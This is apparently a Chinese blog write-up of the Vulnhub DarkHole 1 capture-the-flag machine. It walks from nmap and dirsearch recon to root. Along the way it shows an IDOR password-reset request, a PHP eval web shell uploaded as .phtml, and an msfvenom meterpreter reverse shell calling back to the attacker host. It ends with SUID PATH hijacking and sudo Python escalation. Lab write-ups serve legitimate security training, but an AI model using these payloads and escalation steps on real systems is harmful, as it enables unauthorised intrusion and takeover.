---
title: Vulnhub-DarkHole 1
published: 2025-03-09
tags: [Vulnhub]
category: 靶机
draft: false
---

# DarkHole: 1

> https://www.vulnhub.com/entry/darkhole-1,724/
> 

## 端口扫描主机发现

1. 探测存活主机，`184`是靶机
    
    ```php
    nmap -sP 192.168.75.0/24
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 09:59 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00027s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00016s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.184
    Host is up (0.00032s latency).
    MAC Address: 00:0C:29:61:C5:52 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00018s latency).
    MAC Address: 00:50:56:FE:CA:7A (VMware)
    Nmap scan report for 192.168.75.151
    ```
    
2. 探测主机所有开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.184
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 09:59 CST
    Nmap scan report for 192.168.75.184
    Host is up (0.0011s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 00:0C:29:61:C5:52 (VMware)
    ```
    
3. 探测服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p 80,22 192.168.75.184
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 09:59 CST
    Nmap scan report for 192.168.75.184
    Host is up (0.0022s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    MAC Address: 00:0C:29:61:C5:52 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 4.X|5.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
    OS details: Linux 4.15 - 5.8
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```python
    nmap -script=vuln -p 80,22 192.168.75.184
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 10:00 CST
    Nmap scan report for 192.168.75.184
    Host is up (0.00057s latency).
    
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.184
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |       httponly flag not set
    |   /login.php: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-enum: 
    |   /login.php: Possible admin folder
    |   /config/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    |   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    |_  /upload/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
    MAC Address: 00:0C:29:61:C5:52 (VMware)
    ```
    

## web渗透

1. 访问主页，存在登录页面链接
    
    ![image.png](image%2069.png)
    
2. 先扫描目录看看
    
    ```python
    dirsearch -u http://192.168.75.184 -x 403,404 
    //
    [10:07:48] Starting:                                                                                                                                         
    [10:07:48] 301 -  313B  - /js  ->  http://192.168.75.184/js/                
    [10:08:10] 301 -  317B  - /config  ->  http://192.168.75.184/config/        
    [10:08:10] 200 -  460B  - /config/                                          
    [10:08:11] 301 -  314B  - /css  ->  http://192.168.75.184/css/              
    [10:08:12] 200 -   21B  - /dashboard.php                                    
    [10:08:21] 200 -  487B  - /js/                                              
    [10:08:23] 200 -    1KB - /login.php                                        
    [10:08:24] 302 -    0B  - /logout.php  ->  login.php                        
    [10:08:35] 200 -    1KB - /register.php                                     
    [10:08:45] 301 -  317B  - /upload  ->  http://192.168.75.184/upload/        
    [10:08:45] 200 -  456B  - /upload/       
    ```
    
    - `/dashboard.php`  无权限
    - `/upload` 上传文件夹
    - `/config` 存在database.php
3. 登陆页面存在注册，我们注册用户`test`登录
    
    进去后发现可以`update`信息以及更改密码，感觉会存在注入
    
    ![image.png](image%2070.png)
    
4. 测试是否存在注入
    - `Details Update` 部分
        
        使用`sql`测试没找到注入点
        
    - `Password Change` 部分
        
        这部分没注入….但是修改密码区域可以抓包将传入的`id`值修改，我们可以将其修改为`id=1`的用户（可能是管理用户）
        
        ```python
        POST /dashboard.php?id=2 HTTP/1.1
        Host: 192.168.75.184
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 20
        Origin: http://192.168.75.184
        Sec-GPC: 1
        Connection: keep-alive
        Referer: http://192.168.75.184/dashboard.php?id=2
        Cookie: PHPSESSID=aal4svnq3poomufcq5sv2lo2fu
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i
        
        password=123456&id=1
        ```
        
        成功将包发送，提示`Password has been change`
        
5. 登陆后台，用户名使用`admin` ，密码是用修改后的`123456` ，成功进入
    
    ![image.png](image%2071.png)
    
    多了个上传文件框
    
6. 尝试文件上传上传🐎
    - 直接上传`2.php` ，内容是一句马，提示：`Sorry , Allow Ex : jpg,png,gif` 看着像是白名单
    - 尝试了一下，不只是可以上传`jpg,png,gif` ，也可以上传别的后缀文件，所以更像是把`php`类的文件后缀放进黑名单了
    - 这里涉及到一些文件上传`CTF`的套路，我们将`php`改为其他可以解释为`php`文件的后缀，我将其修改为`phtml` ，上传成功（我是抓包后修改的，也可以直接修改文件后缀然后直接上传）
        
        ```python
        Content-Disposition: form-data; name="fileToUpload"; filename="2.phtml"
        Content-Type: application/octet-stream
        
        <?php @eval($_POST[x]); ?>
        ```
        
    - 上传的文件保存在了`/upload`路径，测试能否使用
        
        ![image.png](image%2072.png)
        
        可以正常包含
        
7. 使用蚁🗡连接
    
    ![image.png](image%2073.png)
    

## 提权

1. 我们先反弹`shell` ，靶机自带的`nc`不支持`-e` ,所以我们需要上传反弹`shell`脚本然后包含
    - 生成脚本
        
        ```python
        msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.75.151 lport=1234 -f raw > getshell.php
        [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
        [-] No arch selected, selecting arch: php from the payload
        No encoder specified, outputting raw payload
        Payload size: 1115 bytes
        ```
        
    - 在蚁🗡将脚本上传`upload`文件夹里
        
        ![image.png](image%2074.png)
        
    - `kali`打开`msf`监听
        
        ```python
        msf6 > use exploit/multi/handler 
        [*] Using configured payload generic/shell_reverse_tcp
        msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
        payload => php/meterpreter/reverse_tcp
        msf6 exploit(multi/handler) > set lhost 192.168.75.151
        lhost => 192.168.75.151
        msf6 exploit(multi/handler) > set lport 1234
        lport => 1234
        msf6 exploit(multi/handler) > run
        ```
        
    - 网页访问上传的脚本文件
        
        ![image.png](image%2075.png)
        
    - 获得`shell`
        
        ```python
        [*] Started reverse TCP handler on 192.168.75.151:1234 
        [*] Sending stage (39927 bytes) to 192.168.75.184
        [*] Meterpreter session 1 opened (192.168.75.151:1234 -> 192.168.75.184:55480) at 2024-11-08 11:49:08 +0800
        
        meterpreter > 
        ```
        
        输入shell获得shell命令行
        
2. 查看权限
    
    ```python
    $ whoami
    www-data
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    $ uname -a
    Linux darkhole 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
    ```
    
3. 寻找利用点
    - SUID权限
        
        ```python
        $ find / -perm -u=s -type f 2>/dev/null
        /usr/lib/snapd/snap-confine
        /usr/lib/policykit-1/polkit-agent-helper-1
        /usr/lib/eject/dmcrypt-get-device
        /usr/lib/dbus-1.0/dbus-daemon-launch-helper
        /usr/lib/openssh/ssh-keysign
        /usr/bin/su
        /usr/bin/at
        /usr/bin/umount
        /usr/bin/pkexec
        /usr/bin/sudo
        /usr/bin/passwd
        /usr/bin/chfn
        /usr/bin/chsh
        /usr/bin/gpasswd
        /usr/bin/fusermount
        /usr/bin/newgrp
        /usr/bin/mount
        /home/john/toto
        ```
        
        `/home/john/toto` 这个一看就不对劲
        
    - 数据库配置文件
        
        ```python
        $ cat database.php
        <?php
        $connect = new mysqli("localhost",'john','john','darkhole');
        ```
        
        可以尝试密码碰撞`ssh`，但是密码错误
        
4. 来到`/home/john/` ，下有四个文件
    
    ```python
    $ ls
    file.py
    password
    toto
    user.txt
    ```
    
    但是除了`toto`有读和执行权限，别的都没有权限，前面`suid`也搜索出了`toto` ，尝试利用
    
5. 利用`toto`
    - 因为不知道有什么作用，我们直接执行
        
        ```python
        $ ./toto
        uid=1001(john) gid=33(www-data) groups=33(www-data)
        ```
        
    - 我们通过蚁🗡下载该文件下来，使用`IDA`反编译看看写了啥
        
        ```python
        int __fastcall main(int argc, const char **argv, const char **envp)
        {
          setuid(0x3E9u);
          setgid(0x3E9u);
          return system("id");
        }
        ```
        
        设置`UID`然后设置`GID`最后输出`ID`命令
        
    - 劫持环境变量
        
        因为他会执行`id` ，所以我们修改环境变量让他执行id的时候执行`/bin/bash`
        
        ```python
        $ echo "/bin/bash" > /tmp/id
        $ chmod 777 /tmp/id
        $ export PATH=/tmp:$PATH 
        ```
        
        `$ export PATH=/tmp:PATH`  设置`/tmp`为环境变量的开头，那样就可以一开始就去`/tmp`寻找 `id` 也就是`/bin/bash`
        
        执行`toto` ，获得`john`的shell
        
        ```python
        $ ./toto
        john@darkhole:/home/john$
        ```
        
6. 获得`john`的用户后查看之前没权限看的文件
    - `password` 是`john`的密码，我们用它去`ssh`登录`john`获得更好的用户交互`shell`
        
        ```python
        john@darkhole:~$ cat password 
        root123
        ```
        
    - `file.py`是空的
        
        ```python
        ohn@darkhole:~$ cat file.py 
        
        ```
        
    - `user.txt` 一个`flag`
        
        ```python
        john@darkhole:~$ cat user.txt 
        DarkHole{You_Can_DO_It}
        ```
        
7. 寻找利用点
    - 查看`sudo`权限
        
        ```python
        john@darkhole:~$ sudo -l
        [sudo] password for john: 
        Matching Defaults entries for john on darkhole:
            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
        
        User john may run the following commands on darkhole:
            (root) /usr/bin/python3 /home/john/file.py
        ```
        
        可以使用`root`权限执行`file.py`文件，哦豁，可以提权了
        
    - 编辑`file.py`文件，将提权语句写入`file.py`
        
        ```python
        ehco "import os;os.system('/bin/bash');" >> file.py
        ```
        
    - 使用`sudo`权限执行
        
        ```python
        john@darkhole:~$ sudo /usr/bin/python3 /home/john/file.py 
        root@darkhole:
        ```
        
        获得root！！！
        
8. 读取`flag`文件
    
    ```python
    root@darkhole:~# cat root.txt 
    DarkHole{You_Are_Legend}
    ```